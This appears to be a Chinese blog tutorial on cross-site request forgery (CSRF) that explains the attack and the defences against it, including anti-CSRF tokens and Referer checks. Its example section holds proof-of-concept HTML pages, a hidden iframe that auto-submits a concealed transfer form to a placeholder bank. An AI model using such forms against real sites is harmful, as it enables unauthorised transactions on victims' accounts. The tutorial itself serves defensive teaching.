---
title: 网络安全第二篇之CSRF
date: 2020-02-16 13:42:15
tags:
    - web security
---

> 跨站请求伪造，也被称为`One Click Attack`或者`Session Riding`，通常缩写`CSRF`或者`XSRF`，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一。

## 1、CSRF是什么？

CSRF（Cross Site Request Forgery），中文是跨站点请求伪造，CSRF攻击者在用户已经登录目标网站后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击的页面对目标网站发起伪造的用户操作请求，达到攻击的目的。

## 2、CSRF攻击实例

### 2-1、简单版
假如我的银行有个转账的接口，account明显是我的账号，to是我要转给的人，如下：

```
http://bank.example/withdraw?account=edward&amount=1000000&to=bob
```

试想下，有人将上面的链接放到我最喜欢的博客网站，并且我恰好刚登录过我的银行网站，那我点击那个链接的后果就是：把我账号里的钱转给bob了。而且这一切都是在我毫不知情的情况下发生的。

### 2-2、升级版

假如我的银行还是有个转账的接口，不过限制了只能发POST的转账请求了。这个时候就做一个第三方的页面，里面包含一个form表单的提交代码，然后通过微信，邮箱等社交工具传播，诱惑用户去打开，那之前登录过这个银行账号的用户就中招了。

有人可能会像下面这样去写这个第三方页面：

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<title>CSRF SHOW</title>
</head>
    <body>
        <!--不嵌iframe会跳转-->
        <iframe style="display:none;">
            <form  name="form1" action="bank.example/withdraw" method="post">
                <input type="hidden" name="account" value="bob"/>
                <input type="hidden" name="to" value="edward"/>
                <input type="hidden" name="amount" value="1000000"/>
                <input type="submit">
            </form>
            <script>
                document.forms.form1.submit();
            </script>
        </iframe>
    </body>
</html>
```

这样是有问题的，因为同源策略，iframe的内容根本加载不出来，所以里面的form表单压根都执行不了。

所以可以用多嵌一层页面的方式解决，如下：

第一个展示页面 （test.html）

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<title>CSRF SHOW</title>
</head>
     <body>
          <iframe style="display:none;" src="test2.html"></iframe>
     </body>
</html>
```

第二个隐藏页面（test2.html）

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<title>CSRF SHOW</title>
</head>
    <body>
        <form  name="form1" action="bank.example/withdraw" method="post">
            <input type="hidden" name="account" value="bob"/>
            <input type="hidden" name="to" value="edward"/>
            <input type="hidden" name="amount" value="1000000"/>
            <input type="submit">
        </form>
        <script>
            document.forms.form1.submit();
        </script>
    </body>
</html>
```

这样就可以解决上面的问题了，这里为什么会多加一层iframe呢，因为不嵌iframe页面会被重定向，这样就降低了攻击的隐蔽性。另外我们的test2.html页面不使用XMLHTTPRqest发送POST请求，是因为有跨域问题，而form可以跨域post数据。


### 2-3、进阶版

假如我的银行还是是有个转账接口，已经限制为POST，但上面的form表单是被我直接放到银行页面的客服留言里，并且展示在了评论区（未过滤），那我的银行就遭受到了XSS攻击了。那么只要把上面被攻击的页面发给其他用户，让他们点击进入，就会自动向我的银行账号转账了，这个组合攻击的方式称为`XSRF`。

## 3、CSRF攻击的本质

CSRF攻击是源于 *Web的隐式身份验证机制* Web的身份验证机制虽然可以保证一个请求是来自用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF一般是服务端解决。


## 4、CSRF的防御手段

### 4-1、尽量使用POST，限制GET

GET接口太容易被拿来做CSRF攻击，看那个简单例子就知道，我们只要构造一个 img标签或者a标签，就能很方便的发起攻击了。接口限制为POST可以降低攻击的风险。

当然POST也不是万无一失，攻击者只要构造一个form表单就可以，但是要在第三方页面做，这样无疑会增加暴露的可能性。

### 4-2、浏览器的Cookie策略

IE6、7、8、Safari会默认拦截第三方本地Cookie的发送（Third-party Cookie）。但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来预防CSRF攻击不靠谱，只能降低风险。

PS：Cookie分为两种，Session Cookie（在浏览器关闭后，就会失效，保存在内存中），Third-part Cookie (即只有到了Exprie后才会失效的Cookie，这种Cookie会保存到本地)。

### 4-3、加验证码

验证码，强制用户必须与应用进行交互，才能完成最终的请求。在通常情况下，验证码能很好的遏制CSRF攻击，但是考虑到用户体验，网站不能强制给所有操作都加上验证码。因此验证码只作为一种辅助手段，不能作为主要解决方案。

### 4-4、Referer Check

Referer Check在WEB最常见的应用就是 *防止图片盗链*。同理，Referer Check也可以被用于请求是否来自合法的 “源”，Referer的值是否是指向页面，或其他在白名单的域，如果不在，就很可能是CSRF攻击了。

这种方法显而易见的好处，就是简单易行，但是Referer的值是浏览器提供的，而浏览器对Referer的具体实现有可能有差别，并不能保证浏览器自身没有安全漏洞。对于某些浏览器，比如IE6或者Firefox2，提供了一些方法来篡改Referer值。即便使用最新的浏览器，黑客无法篡改Referer的值，因为Referer值会记录下用户的访问源，有些用户会认为这样会侵犯到他们的隐私权，因此用户可以自己设置浏览器，使其在发送请求时不提供Referer。

所以，我们也无法用Referer Check作为防御CSRF攻击的主要手段。但是可以用它来监控CSRF的发生。

### 4-5、Anti CSRF Token

现在业界对CSRF的防御，一致的做法是使用Token （Anti CSRF Token）。步骤如下：

> 1、用户访问某个表单页。
>
> 2、服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。
>
> 3、在页面表单附带上Token参数
>
> 4、用户提交请求后，服务器验证表单中的Token是否于用户Session（或Cookie）中的Token一致，一致为合法请求，不一致则为非法请求。

这个Token的值必须是随机的，不可预测。由于Token的存在，攻击者无法在构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意 *Token的保密性* ，尽量把敏感的操作由GET改为POST，以form表单或Ajax形式提交。

Token仅仅是对抗CSRF的攻击。当网站同事存在XSS漏洞时，那这个方案也是无效的。所以XSS带来的问题，应该用XSS的防御方案给与解决。


## 结束语

CSRF是一种危害极大的攻击，又很难防御。目前几种防御策略虽然可以很多程度上抵御CSRF的攻击，但是并没有一种完美的解决方案。一些新的方案真在研究中，比如每次请求都使用不同的动态口令，把Referer和Token的方案结合起来，甚至尝试修改HTTP规范，但这些新的方案尚不成熟，要正式投入并被业界广泛接受还需时日。在这之前，我们只有充分重视CSRF，根据系统的实际情况选择合适的策略，这样才能把CSRF的危害降到最低。

## 链接

[CSRF 攻击的应对之道](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html)

[Web安全之CSRF攻击](https://www.cnblogs.com/lovesong/p/5233195.html)